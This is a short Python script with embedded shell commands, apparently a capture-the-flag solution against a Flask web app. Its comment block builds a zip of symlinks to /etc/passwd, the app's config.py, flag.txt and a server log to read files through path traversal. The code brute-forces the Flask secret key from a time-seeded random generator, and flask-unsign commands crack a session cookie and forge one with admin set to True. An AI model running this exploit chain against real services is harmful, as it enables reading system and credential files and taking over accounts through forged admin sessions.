import datetime
import random
from datetime import datetime, timezone, timedelta
'''
ln -s ../../../../../../../../../etc/passwd passwd
ln -s ../../../../../../../../../app/config.py config.py
ln -s ../../../../../../../../../app/flag.txt flag.txt
ln -s ../../../../../../../../../tmp/server.log server.log
zip --symlink exploit.zip passwd config.py flag.txt server.log
'''

# 2023-01-15 23:05:31 +0000
start = datetime(2023, 1, 15, 23, 5, 31, 0, timezone(timedelta(0))).timestamp() - 2
SECRET_OFFSET = -67198624

secret_list = []
for i in range(100000): # 100s
    random.seed(round((start + SECRET_OFFSET) * 1000) + i)
    secret_list.append("".join([hex(random.randint(0, 15)) for x in range(32)]).replace("0x", ""))

fw = open('secret_list.txt', 'w')
fw.write('\n'.join(secret_list))

'''
flask-unsign --unsign --cookie 'eyJhZG1pbiI6ZmFsc2UsInVpZCI6InlhbmdtaW4ifQ.Y8UfdA.kr27kXrVFCeRW0v_eZbZjkhC_7s' -w secret_list.txt
flask-unsign --sign --cookie "{'admin': True, 'uid': 'yangmin'}" --secret 16522bdca70f4af3b2b03fc988cb1d9a
'''